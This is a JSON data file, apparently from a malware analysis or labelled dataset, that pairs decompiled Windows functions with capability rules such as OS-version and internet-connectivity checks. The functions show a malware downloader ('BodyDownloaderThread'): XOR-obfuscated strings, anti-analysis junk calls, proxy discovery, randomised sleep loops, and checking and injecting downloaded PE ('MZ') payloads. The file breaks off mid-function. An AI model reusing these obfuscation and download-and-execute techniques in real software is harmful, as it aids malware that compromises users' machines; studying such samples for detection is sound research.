            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040b460(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    int32_t var_5ch;\n    int32_t *var_58h;\n    uint var_54h;\n    ushort var_50h;\n    uchar var_4eh;\n    uint var_4dh;\n    uchar var_49h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_70h = *0x41daa4;\n    var_64h = *0x41dab8;\n    var_6ch = 5;\n    var_4dh._0_1_ = 5;\n    var_54h = 0x3e390f30;\n    var_50h = 0xc2b;\n    var_4eh = 0x36;\n    var_4dh._1_2_ = 0x3033;\n    var_4dh._3_1_ = 0x25;\n    var_14h = 6;\n    var_49h = 6;\n    var_48h = 0x2a35033c;\n    var_44h = 0x1922183f;\n    var_40h = 0x12392c2f;\n    var_3ch = 0x77741728;\n    var_38h = 0x5e635b11;\n    var_34h = 0x5d786f6e;\n    var_30h = 0x5a6a5469;\n    var_8h = 0x5a5a6d51;\n    var_4h._0_2_ = 0x6a4e;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar9 = 0;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0x352017) {\n            pcVar5[iVar9] = *(&var_8h + iVar9 % var_14h) ^ (pcVar5 + iVar9)[&var_54h - pcVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_14h = 0;\n    var_ch = 0x413300;\n    do {\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_68h = 0;\n        var_60h = 0;\n        iVar9 = 0;\n        var_5ch = 1;\n        do {\n            if (var_ch[var_14h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_14h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040b581;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x0040b581:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            var_2ch = 0x5036025f;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_28h = 0x35190318;\n            puVar10 = &var_1ch;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_24h = 0x555f5e41;\n            var_20h._0_2_ = 0x3522;\n            var_8h = 0x35467070;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6a);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_5ch = &var_2ch - iVar9;\n            do {\n                iVar7 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar7 != 0x77029b) {\n                    *(iVar6 + iVar9) = *(&var_8h + iVar6 % var_6ch) ^ (iVar6 + iVar9)[var_5ch];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_70h);\n            iVar6 = fcn.00401abf(0, &ARG_0, &var_60h, &var_68h);\n            if (iVar6 == 0) {\n                if (var_60h == 0) {\n                    fcn.0040d3e1();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                if (var_1ch < var_60h) {\n                    fcn.0040d3e1();\n                    var_64h = var_64h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_64h % 600000 + 60000);\n                }\n                else if (((4 < var_60h) && (var_60h == var_1ch)) &&\n                        ((var_18h != NULL && ((*var_18h == 'M' && (var_18h[1] == 'Z')))))) {\n                    fcn.0040d412();\n                    fcn.0040d3e1();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_14h = var_14h + 1;\n    } while (var_ch < 0x413440);\n    iVar9 = *var_58h;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1884
    },
    "0040b73d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040b7ab)\n// WARNING: Removing unreachable block (ram,0x0040b7bb)\n// WARNING: Removing unreachable block (ram,0x0040b7c8)\n// WARNING: Removing unreachable block (ram,0x0040b7d7)\n// WARNING: Removing unreachable block (ram,0x0040b7dc)\n// WARNING: Removing unreachable block (ram,0x0040b7e6)\n// WARNING: Removing unreachable block (ram,0x0040b7f0)\n// WARNING: Removing unreachable block (ram,0x0040b820)\n// WARNING: Removing unreachable block (ram,0x0040b824)\n// WARNING: Removing unreachable block (ram,0x0040b834)\n// WARNING: Removing unreachable block (ram,0x0040b847)\n// WARNING: Removing unreachable block (ram,0x0040b8d2)\n// WARNING: Removing unreachable block (ram,0x0040b867)\n// WARNING: Removing unreachable block (ram,0x0040b885)\n// WARNING: Removing unreachable block (ram,0x0040b88a)\n\nuint __cdecl fcn.0040b73d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    \n    uVar2 = *0x41dab8;\n    puVar3 = 0x41db88;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    fcn.0040b381();\n    iVar1 = 600000;\n    while ((*_sym.imp.KERNEL32.dll_Sleep)(iVar1),  *0x41dab4 == 0) {\n        if (*0x41daa4 == 0) {\n            iVar1 = 0x32;\n        }\n        else {\n            iVar1 = fcn.0040b460();\n            if (iVar1 != 0) {\n                fcn.0040d3e1();\n            }\n            uVar2 = uVar2 * 0x19660d + 0x3c6ef35f;\n            iVar1 = uVar2 % 600000 + 60000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 530
    },
    "0040b963": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b963(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.0040b90f(),  iVar6 != 0)) {\n        uVar8 = 1;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar6 != 0)) {\n            bVar10 = pProxyConfig != 0;\n            var_50h = 0;\n            uStack80 = 0;\n            uStack76 = 0;\n            var_54h = bVar10;\n            pAutoProxyOptions = bVar10;\n            if (var_38h != 0) {\n                pAutoProxyOptions = bVar10 | 2;\n                var_50h = var_38h;\n            }\n            var_44h = 1;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar6, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n                pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (CONCAT13(var_8h._3_1_, CONCAT21(var_8h._1_2_, var_8h)) != 0) {\n                    (*pcVar1)(CONCAT13(var_8h._3_1_, CONCAT21(var_8h._1_2_, var_8h)));\n                }\n                goto code_r0x0040bc62;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (CONCAT13(var_8h._3_1_, CONCAT21(var_8h._1_2_, var_8h)) != 0) {\n                (*pcVar1)(CONCAT13(var_8h._3_1_, CONCAT21(var_8h._1_2_, var_8h)));\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x0040bad9:\n                iVar6 = var_34h;\n                iVar7 = fcn.0040996d();\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar7 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x0040bc62;\n                }\n                pProxyInfo = 0x59134f3c;\n                psz2 = 0x4f246937;\n                var_8h._0_1_ = 0x14;\n                var_8h._1_2_ = 0x7959;\n                var_8h._3_1_ = 0x69;\n                var_4h._0_2_ = 0x4f54;\n                var_1ch = 0x59674f54;\n                var_18h._0_2_ = 0x6943;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_14h = 0;\n                var_28h = &pProxyInfo - iVar6;\n                var_40h = 6;\n                pszSrch = iVar6;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    if (iVar7 != 0xe90c0a) {\n                        *(var_14h + iVar6) = *(&var_1ch + var_14h % var_40h) ^ (var_14h + iVar6)[var_28h];\n                    }\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x6c2d782d;\n                psz2 = 0x78354906;\n                var_8h._0_1_ = 0x2a;\n                var_8h._1_2_ = 0x726c;\n                var_8h._3_1_ = 0x49;\n                var_1ch = 0x6c597845;\n                var_18h._0_2_ = 0x4972;\n                uVar8 = (*pcVar1)(8, 0x19);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar7 = 0;\n                var_28h = &pProxyInfo - iVar6;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    iVar3 = pszSrch;\n                    if (iVar4 != 0x1557e0) {\n                        *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_40h) ^ (iVar7 + iVar6)[&pProxyInfo - iVar6];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 0xc);\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar7 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.004098fa(&var_14h);\n                uVar8 = 1;\n                while (pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n                    if ((pszSrch == (iVar7 == lpcwszUrl)) && (iVar7 = fcn.0040996d(),  iVar7 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar1)(uVar5);\n                        goto code_r0x0040bc62;\n                    }\n                    lpcwszUrl = fcn.004098fa(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar1)(0, iVar3);\n                (*pcVar2)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.004098fa(&var_14h);\n                    if (iVar6 == 0) goto code_r0x0040bad9;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x0040bc62:\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar1)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar1)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2403
    },
    "0040c345": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c345(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040700c;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41db4c & 1) != 0)) {\n        var_20h = 0x413010;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.00407de0(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00407b4d(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.00407fb9(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41db4c & 1) != 0)) {\n                iVar3 = fcn.0040c00e();\n            }\n            else {\n                iVar3 = fcn.0040bcbe();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.0040c50d(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.00407ca9();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1171
    },
    "0040cd1f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040cd1f(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = -1;\n    var_8h = *0x41dab8;\n    var_44h = 0x3e390f30;\n    var_40h = 0x5360c2b;\n    var_3ch._0_2_ = 0x3033;\n    var_3ch._2_1_ = 0x25;\n    var_4h = 6;\n    var_3ch._3_1_ = 6;\n    var_38h = 0x2a35033c;\n    var_34h = 0x1922183f;\n    var_30h = 0x12392c2f;\n    var_2ch = 0x77741728;\n    var_28h = 0x5e635b11;\n    var_24h = 0x5d786f6e;\n    var_20h = 0x5a6a5469;\n    var_14h = 0x5a5a6d51;\n    var_10h._0_2_ = 0x6a4e;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar5 != 0x352017) {\n            pcVar4[iVar7] = *(&var_14h + iVar7 % var_4h) ^ (pcVar4 + iVar7)[&var_44h - pcVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x28);\n    iVar7 = 0;\n    pcVar8 = 0x413300;\n    do {\n        var_14h = 1;\n        var_4h = 0;\n        do {\n            if (pcVar8[iVar7] != '\\0') {\n                cVar2 = *pcVar4;\n                pcVar6 = pcVar4;\n                while (cVar2 != pcVar8[iVar7]) {\n                    if (cVar2 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x0040ce12;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    cVar2 = *pcVar6;\n                }\n            }\n            var_4h = var_4h + 1;\n        } while (var_4h < 0x20);\n        bVar1 = true;\ncode_r0x0040ce12:\n        if (((*pcVar8 != '\\0') && (pcVar8[0x1f] == '\\0')) && (bVar1)) {\n            iVar5 = fcn.004057d7();\n            if (iVar5 != -1) {\n                *var_1ch = iVar5;\n                var_ch = iVar7;\n                break;\n            }\n            var_8h = var_8h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_8h % 600000 + 60000);\n        }\n        pcVar8 = pcVar8 + 0x20;\n        iVar7 = iVar7 + 1;\n    } while (pcVar8 < 0x413440);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_ch;\n}\n",
        "token_count": 1030
    },
    "0040ce8d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040ce8d(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_EDX;\n    uchar *puVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    puVar7 = &var_10h;\n    var_8h = in_EDX;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.00401092(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_10h != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_ch) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        puVar4 = uVar3 + var_ch;\n                        goto code_r0x0040cef9;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_10h - 4U);\n        }\ncode_r0x0040cef9:\n        if (puVar4 != NULL) {\n            puVar5 = puVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = 0x413300;\n            puVar8 = puVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar8 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar8 = puVar8 + 1;\n            }\n            puVar5 = puVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            pcVar6 = 0x413300;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar4, arg_8h * 0x20 + 0x413300);\n            do {\n                puVar4 = puVar4 + 0x20;\n                if (*pcVar6 != '\\0') {\n                    (*pcVar1)(puVar4, pcVar6);\n                }\n                pcVar6 = pcVar6 + 0x20;\n            } while (pcVar6 < 0x413420);\n        }\n        fcn.0040d3e1();\n        *var_8h = var_10h;\n        var_8h[1] = var_ch;\n        puVar4 = 0x1;\n    }\n    return puVar4;\n}\n",
        "token_count": 804
    },
    "0040cf7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d06b)\n// WARNING: Removing unreachable block (ram,0x0040d086)\n// WARNING: Removing unreachable block (ram,0x0040d08d)\n// WARNING: Removing unreachable block (ram,0x0040d094)\n// WARNING: Removing unreachable block (ram,0x0040d0c7)\n\nuint __cdecl fcn.0040cf7e(uint arg_8h)\n\n{\n    char cVar1;\n    uint arglist;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    uchar auStack408 [404];\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, auStack408);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41dbcc;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040d130();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41db54);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.00403dd2();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.0040ce8d(0),  iVar2 != 0)) {\n        fcn.0040d3e1();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41db54);\n    }\n    arglist = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0xa9);\n    fcn.00401f6b(\"<%d>: BODYDOWNLOADER.CPP:%d > BodyDownloaderThread : initial body stage finish, start redownload loop\"\n                 , arglist);\n    while (*0x41dab4 == 0) {\n        iVar2 = fcn.0040cd1f();\n        if (iVar2 != -1) {\n            fcn.00405859();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 590
    },
    "0040d412": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d412(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 